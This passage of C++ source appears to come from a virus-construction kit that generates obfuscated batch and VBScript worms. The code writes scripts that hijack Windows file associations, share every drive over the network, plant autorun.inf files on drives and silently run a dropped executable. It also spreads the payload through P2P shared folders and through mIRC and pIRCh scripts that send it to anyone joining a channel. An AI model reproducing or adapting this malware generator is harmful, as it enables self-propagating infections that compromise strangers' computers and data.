        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCR\\com%" + rsss + "%d\\\",\""+CaseRand("wscript")+" "+istd+"\\" + rssv + ".vbs \"\"%%1 %%*\"\"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    if (Form15->CheckBox17->Checked)
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCR\\bat%" + rsss + "%d\\\",\""+CaseRand("wscript")+" "+istd+"\\" + rssv + ".vbs \"\"%%1 %%*\"\"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    if (Form15->CheckBox18->Checked)
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCR\\pif%" + rsss + "%d\\\",\""+CaseRand("wscript")+" "+istd+"\\" + rssv + ".vbs \"\"%%1 %%*\"\"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    if (Form15->CheckBox1->Checked)
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCR\\cmd%" + rsss + "%d\\\",\""+CaseRand("wscript")+" "+istd+"\\" + rssv + ".vbs \"\"%%1 %%*\"\"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    if (Form15->CheckBox40->Checked)
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCR\\scr%" + rsss + "%d\\\",\""+CaseRand("wscript")+" "+istd+"\\" + rssv + ".vbs \"\"%%1 %%*\"\"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    if (Form15->CheckBox84->Checked)
    { // drives sharing
        int dst=258;
        if (Form15->CheckBox89->Checked) dst=770;
        wstf(CaseRand("echo")+" dim " + adsd + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + ".regwrite \"HKLM\\"+CaseRand("Software\\Microsoft\\Windows\\Curren\"&chr(115+1)&\"Version\\Network\\Installed")+"\",\"1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" for each " + adsd + " in " + sfso + ".drives>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + ".regwrite \"HKLM\\"+CaseRand("Software\\Microsoft\\Windows\\Curren\"&chr(115+1)&\"Version\\Network\\LanMan\\")+Form15->Edit4->Text+"\"&" + adsd + ".driveletter&\"$\\Flags\","+AnsiString(dst)+",\"REG_DWORD\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + ".regwrite \"HKLM\\"+CaseRand("Software\\Microsoft\\Windows\\Curren\"&chr(115+1)&\"Version\\Network\\LanMan\\")+Form15->Edit4->Text+"\"&" + adsd + ".driveletter&\"$\\Type\",0,\"REG_DWORD\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + ".regwrite \"HKLM\\"+CaseRand("Software\\Microsoft\\Windows\\Curren\"&chr(115+1)&\"Version\\Network\\LanMan\\")+Form15->Edit4->Text+"\"&" + adsd + ".driveletter&\"$\\Path\"," + adsd + ".path&\"\\\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox20->Checked)
    {
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + lfdc + "=" + wshl + ".createshortcut(\"%"+CaseRand("tmp")+"%\\" + lfds + ".lnk\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + lfdc + ".targetpath=" + wshl + ".expandenvironmentstrings(\""+istd+"\\" + istv + ".vbs\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + lfdc + ".windowstyle=4>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + lfdc + ".save>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox14->Checked)
    {
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + pfdc + "=" + wshl + ".createshortcut(\"%"+CaseRand("tmp")+"%\\" + pfds + ".lnk\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + pfdc + ".targetpath=" + wshl + ".expandenvironmentstrings(\""+istd+"\\" + tmpn + ".bat\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + pfdc + ".windowstyle=2>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + pfdc + ".save>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox82->Checked && Form15->Edit24->Text != "")
    {
        ftcd = Form15->ComboBox22->Text;
        if (Form15->ComboBox22->Text == "System" || Form15->ComboBox22->Text ==  "System32") ftcd = "%windir%\\" + Form15->ComboBox22->Text;
        if (Form15->ComboBox22->Text == "Root") ftcd = "c:";
        if (Form15->ComboBox22->Text ==  "Recycle Bin") ftcd = "c:\\recycled";
        ifstream ftcs;
        ftcs.open(Form15->Edit24->Text.c_str(),ios::binary);
        wstf(CaseRand("echo")+" set " + ftc1 + "=" + sfso + ".createtextfile(\""+ftcd+"\\"+Form15->Edit25->Text+"\",1)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        char a;
        int cnt = 20;
        bool fv = 0;
        while (ftcs.get(a))
        {
            unsigned char b = a;
            AnsiString asci = AnsiString(int(b));
            if (cnt==20)
            {
                if (fv == 1)
                {
                    wstf(">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                }
                else fv = 1;
                wstfnr(CaseRand("echo")+" " + ftc1 + ".write chr("+asci+")");
                cnt=1;
            }
            else
            {            
                wstfnr("&chr("+asci+")");
                cnt++;
            }
        }
        if (cnt != 1) wstf(">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        ftcs.close();
        wstf(CaseRand("echo")+" " + ftc1 + ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox83->Checked)
        {
            if (Form15->ComboBox23->ItemIndex == 0)
                wstf(CaseRand("echo")+" " + wshl + ".run \""+ftcd+"\\"+Form15->Edit25->Text+"\",0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            if (Form15->ComboBox23->ItemIndex == 1)
            {
                wstf("echo if " + wshl + "."+CaseRand("regread")+"(\"HKCU\\Software\\" + plrn + "\\" +ftck+ "\")=\"\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + wshl + ".run \""+ftcd+"\\"+Form15->Edit25->Text+"\",0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf("echo " + wshl + "."+CaseRand("regwrite")+" \"HKCU\\Software\\" + plrn + "\\" +ftck+ "\,\""+ftcx+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf("echo end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
        }
    }
    if ((Form15->CheckBox61->Checked == true && Form15->CheckBox88->Checked == true) || Form15->CheckBox93->Checked == true || Form15->CheckBox78->Checked == true || Form15->CheckBox77->Checked == true || Form15->CheckBox76->Checked == true || Form15->CheckBox50->Checked == true || Form15->CheckBox44->Checked == true || Form15->CheckBox22->Checked == true || Form15->CheckBox57->Checked == true || Form15->RadioButton13->Checked == true || Form15->RadioButton14->Checked == true || Form15->RadioButton12->Checked == true)
    {   // ALL DIRS
        AnsiString dtn = 3;
        if (Form15->CheckBox63->Checked) dtn = 4;
        wstf(CaseRand("echo")+" dim " + sdrv + "," + sfld + ","+sfls+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + drvs + "()>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" sub " + drvs + "()>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+".on error resume next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" for each " + sdrv + " in " + sfso + ".drives>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox63->Checked)
            wstf(CaseRand("echo")+" if not(" + sdrv + ".drivetype=4) and not(" + sdrv + ".drivetype=5) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        else
        wstf(CaseRand("echo")+" if not(" + sdrv + ".drivetype=3) and not(" + sdrv + ".drivetype=4) and not(" + sdrv + ".drivetype=5) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox22->Checked == true)
        {
            wstf(CaseRand("echo")+" " + sfso + ".copyfile \""+istd+"\\" + istv + ".vbs\"," + sdrv + ".path & \"\\" + istv + ".vbs\",1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + aiia + "=" + sfso + ".getfile(" + sdrv + ".path & \"\\autorun.inf\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + aiia + ".attributes=38>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + aiif + "=" + sfso + ".createtextfile(" + sdrv + ".path & \"\\autorun.inf\",1)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + aiif+ ".writeline \"[autorun]\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + aiif+ ".writeline \"open="+CaseRand("wscript")+" "+istd+"\\" + istv + ".vbs\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + aiif+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + aiia + ".attributes=38>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        wstf(CaseRand("echo")+" " + fldf + "(" + sdrv + ".path&\"\\\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end sub>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox50->Checked)
        {
            wstf(CaseRand("echo")+" sub " + p2pi + "(" + p2pp + ")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+".on error resume next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            if (Form15->ComboBox16->Text == ".bat" || Form15->ComboBox16->Text == ".cmd") wstf(CaseRand("echo")+" "+CaseRand("set")+" " + p2pk + "=" + sfso + ".getfile(\""+istd+"\\" + tmpn + ".bat\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            if (Form15->ComboBox16->Text == ".vbs" || Form15->ComboBox16->Text == ".vbe") wstf(CaseRand("echo")+" "+CaseRand("set")+" " + p2pk + "=" + sfso + ".getfile(\""+istd+"\\" + istv + ".vbs\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            if (Form15->ComboBox16->Text == ".js" || Form15->ComboBox16->Text == ".jse") wstf(CaseRand("echo")+" "+CaseRand("set")+" " + p2pk + "=" + sfso + ".getfile(\""+istd+"\\" + istj + ".js\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            if (Form15->ComboBox16->Text == ".htm" || Form15->ComboBox16->Text == ".html") wstf(CaseRand("echo")+" "+CaseRand("set")+" " + p2pk + "=" + sfso + ".getfile(\"%"+CaseRand("tmp")+"%\\" + htmt + "."+tfre+"\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            if (Form15->ComboBox16->Text == ".doc") wstf(CaseRand("echo")+" "+CaseRand("set")+" " + p2pk + "=" + sfso + ".getfile(\"%"+CaseRand("tmp")+"%\\" + wmid + "."+tfre+"\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            if (Form15->ComboBox16->Text == ".xls") wstf(CaseRand("echo")+" "+CaseRand("set")+" " + p2pk + "=" + sfso + ".getfile(\"%"+CaseRand("tmp")+"%\\" + emis + "."+tfre+"\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            for (int count=0; count<Form15->Memo2->Lines->Count; count++)
                wstf(CaseRand("echo")+" " + p2pk + ".copy " + p2pp + "&\"\\"+Form15->Memo2->Lines->Strings[count]+Form15->ComboBox16->Text+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" end sub>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }          
        wstf(CaseRand("echo")+" sub " + fldf + "(" + flds + ")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+".on error resume next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + fldt + "=" + sfso + ".getfolder(" + flds + ")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox50->Checked)
        {
            wstf(CaseRand("echo")+" dim "+ p2pd +">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+ p2pd +"=lcase(" + fldt + ".name)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" if "+ p2pd +"=\"\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            if (Form15->CheckBox79->Checked)
            {
                wstf(CaseRand("echo")+" elseif "+ p2pd +"=\"morpheus\" or "+ p2pd +"=\"kmd\" or "+ p2pd +"=\"kazaa\" or "+ p2pd +"=\"kazaa lite\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+ p2pi +"(" + fldt + ".path & \"\\\My Shared Folder\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            if (Form15->CheckBox80->Checked)
            {
                wstf(CaseRand("echo")+" elseif "+ p2pd +"=\"edonkey2000\" or "+ p2pd +"=\"emule\" or "+ p2pd +"=\"overnet\" or "+ p2pd +"=\"applejuice\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+ p2pi +"(" + fldt + ".path & \"\\\Incoming\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            if (Form15->CheckBox75->Checked)
            {
                wstf(CaseRand("echo")+" elseif "+ p2pd +"=\"bearshare\" or "+ p2pd +"=\"limewire\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+ p2pi +"(" + fldt + ".path & \"\\\Shared\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            if (Form15->CheckBox74->Checked)
            {
                wstf(CaseRand("echo")+" elseif "+ p2pd +"=\"grokster\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+ p2pi +"(" + fldt + ".path & \"\\\My Grokster\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            if (Form15->CheckBox81->Checked)
            {
                wstf(CaseRand("echo")+" elseif "+ p2pd +"=\"icq\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+ p2pi +"(" + fldt + ".path & \"\\\Shared Files\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);        }
        if (Form15->CheckBox76->Checked == true)
        { // mIRC spreading
            AnsiString mirf;
            if (Form15->ComboBox17->Text == ".bat" || Form15->ComboBox17->Text == ".cmd") mirf = istd+"\\" + tmpn + ".bat";
            if (Form15->ComboBox17->Text == ".vbs" || Form15->ComboBox17->Text == ".vbe") mirf = istd+"\\" + istv + ".vbs";
            if (Form15->ComboBox17->Text == ".js" || Form15->ComboBox17->Text == ".jse") mirf = istd+"\\" + istj + ".js";
            if (Form15->ComboBox17->Text == ".htm" || Form15->ComboBox17->Text == ".html") mirf = "%"+CaseRand("tmp")+"%\\" + htmt + "."+tfre;
            if (Form15->ComboBox17->Text == ".doc") mirf = "%"+CaseRand("tmp")+"%\\" + wmid + "."+tfre;
            if (Form15->ComboBox17->Text == ".xls") mirf = "%"+CaseRand("tmp")+"%\\" + emis + "."+tfre;
            wstf(CaseRand("echo")+" dim "+ mird +">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+ mird +"=lcase(" + fldt + ".name)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" if "+ mird +"=\"mirc\" or "+ mird +"=\"mirc32\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + sfso + ".copyfile \""+mirf+"\"," + fldt + ".path&\"\\" + misn + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + mirs + "=" + sfso + ".createtextfile(" + fldt + ".path&\"\\%" + vbih + "%.ini\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + mirs + ".writeline \"[%" + vbih + "%]\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            if (Form15->Edit17->Text == "")
            {
                wstf(CaseRand("echo")+" " + mirs + ".writeline \"n0=on 1:join:#:{\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + mirs + ".writeline \"n1= /if ($nick!=$me) /dc\"&chr(98+1)\" send $nick \"&" + fldt + ".path&\"\\" + misn + " }\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            else
            {
                wstf(CaseRand("echo")+" " + mirs + ".writeline \"n0=on 1:join:#:{\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + mirs + ".writeline \"n1= /if ($nick==$me) {halt}\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + mirs + ".writeline \"n2= /msg $nick "+Form15->Edit17->Text+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + mirs + ".writeline \"n3= /dcc \"&chr(114+1)\"end $nick \"&" + fldt + ".path&\"\\" + misn + " }\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            wstf(CaseRand("echo")+" " + mirs + ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        if (Form15->CheckBox78->Checked == true)
        { // pIRCh spreading
            AnsiString pirf;
            if (Form15->ComboBox18->Text == ".bat" || Form15->ComboBox18->Text == ".cmd") pirf = istd+"\\" + tmpn + ".bat";
            if (Form15->ComboBox18->Text == ".vbs" || Form15->ComboBox18->Text == ".vbe") pirf = istd+"\\" + istv + ".vbs";
            if (Form15->ComboBox18->Text == ".js" || Form15->ComboBox18->Text == ".jse") pirf = istd+"\\" + istj + ".js";
            if (Form15->ComboBox18->Text == ".htm" || Form15->ComboBox18->Text == ".html") pirf = "%"+CaseRand("tmp")+"%\\" + htmt + "."+tfre;
            if (Form15->ComboBox18->Text == ".doc") pirf = "%"+CaseRand("tmp")+"%\\" + wmid + "."+tfre;
            if (Form15->ComboBox18->Text == ".xls") pirf = "%"+CaseRand("tmp")+"%\\" + emis + "."+tfre;
            wstf(CaseRand("echo")+" dim "+ pird +">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+ pird +"=lcase(" + fldt + ".name)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" if "+ pird +"=\"pirch\" or "+ pird +"=\"pirch98\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + sfso + ".copyfile \""+pirf+"\"," + fldt + ".path&\"\\" + pisn + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + pirs + "=" + sfso + ".createtextfile(" + fldt + ".path&\"\\Events.ini\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"[Levels]\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"Enabled=1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"Count=6\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"Level1=000-Unknows\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"000-UnknowsEnabled=1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"Level2=100-Level 100\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"100-Level 100Enabled=1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"Level3=200-Level 200\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"200-Level 200Enabled=1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"Level4=300-Level 300\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"300-Level 300Enabled=1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"Level5=400-Level 400\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"400-Level 400Enabled=1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"Level6=500-Level 500\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"500-Level 500Enabled=1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            if (Form15->Edit21->Text != "")
            {
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"[000-Unknowns]\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"UserCount=0\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"Event1=ON JOIN:#:/msg $nick "+Form15->Edit21->Text+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"EventCount=0\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"[100-Level 100]\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"User1=*!*@*\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"UserCount=1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"Events1= ON JOIN:#: /dcc send $nick \"&" + fldt + ".path&\"\\" + pisn + "\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"EventCount=1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            else
            {
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"[000-Unknowns]\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"User1=*!*@*\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"UserCount=1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"Events1= ON JOIN:#: /dcc send $nick \"&" + fldt + ".path&\"\\" + pisn + "\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"EventCount=1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"[100-Level 100]\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"UserCount=0\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + pirs + ".writeline \"EventCount=0\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"[200-Level 200]\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"UserCount=0\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"EventCount=0\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"[300-Level 300]\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"UserCount=0\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"EventCount=0\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"[400-Level 400]\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"UserCount=0\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"EventCount=0\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"[500-Level 500]\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"UserCount=0\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + pirs + ".writeline \"EventCount=0\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        if (Form15->CheckBox77->Checked == true)
        { // vIRC spreading
            AnsiString virf;
            if (Form15->ComboBox19->Text == ".bat" || Form15->ComboBox19->Text == ".cmd") virf = istd+"\\" + tmpn + ".bat";
            if (Form15->ComboBox19->Text == ".vbs" || Form15->ComboBox19->Text == ".vbe") virf = istd+"\\" + istv + ".vbs";
            if (Form15->ComboBox19->Text == ".js" || Form15->ComboBox19->Text == ".jse") virf = istd+"\\" + istj + ".js";
            if (Form15->ComboBox19->Text == ".htm" || Form15->ComboBox19->Text == ".html") virf = "%"+CaseRand("tmp")+"%\\" + htmt + "."+tfre;
            if (Form15->ComboBox19->Text == ".doc") virf = "%"+CaseRand("tmp")+"%\\" + wmid + "."+tfre;
